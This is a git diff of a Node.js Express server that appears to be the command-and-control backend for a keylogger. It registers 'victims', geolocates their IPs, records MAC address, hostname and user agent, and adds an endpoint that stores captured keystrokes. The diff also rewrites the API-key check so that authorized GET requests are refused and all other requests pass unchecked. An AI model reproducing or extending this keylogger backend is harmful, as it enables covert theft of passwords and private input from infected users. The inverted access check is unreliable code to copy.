@@ -18,9 +18,7 @@ const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
 const Log = sequelize.import(path.join(__dirname, '../models/log'));
 Victim.Logs = Victim.hasMany(Log);
 
-sequelize.sync({
-  force: true
-})
+sequelize.sync()
 .then(()=> {
   console.log("Set up database successfully");
   // TODO: remove test-case
@@ -56,10 +54,10 @@ router.use('/victims', (req, res, next) => {
     // grab api key from various request methods
     var apikey = req.header('X-API-KEY') || req.query.apikey || req.body.apikey;
 
-    if(config.api.keys.indexOf(apikey) >= 0){
-      next();
-    } else{
+    if(req.method == "GET" && config.api.keys.indexOf(apikey) >= 0){
       res.status(403).json({error: "unauthorized"})
+    } else{
+      next();
     }
   });
 
@@ -123,8 +121,8 @@ router.get('/victims/:id/logs', (req, res) => {
 });
 
 /**
- * @api {post} /api/victim Create the victim to log
- * @apiName AddKeystrokes
+ * @api {post} /api/victims Create the victim to log
+ * @apiName CreateVictim
  * @apiGroup Log
  * 
  * @apiPermission None
@@ -137,25 +135,22 @@ router.get('/victims/:id/logs', (req, res) => {
 router.post('/victims', (req, res) => {
   var ip = req.connection.remoteAddress;
   // FIXME: rem default ip
-  ip = "212.152.179.113";
+  // ip = "212.152.179.113";
   var useragent = req.headers['user-agent'];
   
-  console.log("1")
   request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
     if (!error && response.statusCode == 200) {
       var ipInfo = JSON.parse(body);
-      console.log("2")
 
       if(ipInfo.status == 'fail')
         res.status(400).json({ error: ipInfo.message })
       else {
-        // TODO: insert in database
         Victim.create({
           ip: ip,
           country: ipInfo.country,
           region: ipInfo.regionName,
           city: ipInfo.city,
-          macAdress: req.body.macAdress,
+          macAddress: req.body.macAddress,
           useragent: req.headers['user-agent'],
           uuid: req.body.uuid,
           hostname: req.body.hostname
@@ -167,5 +162,29 @@ router.post('/victims', (req, res) => {
       }
     }
   })
+});
+
+/**
+ * @api {post} /api/victims/:id/logs Create logs for specific victim
+ * @apiName CreateLog
+ * @apiGroup Log
+ * 
+ * @apiPermission None
+ * 
+ * @apiParam {String} keystrokes Keystrokes to add in database
+ * @apiSuccess {Object} message
+ */
+router.post('/victims/:id/logs', (req, res) => {
+  console.log('smth: ', req.body, req.params.id)
+
+  Log.create({
+    victimId: req.params.id,
+    keystrokes: req.body.keystrokes
+  }).then(() => {
+    res.status(200).json({message: "success"});
+  }).catch((error) => {
+    res.status(400).json({message: "failed"});
+  })
+
 });
 module.exports = router;
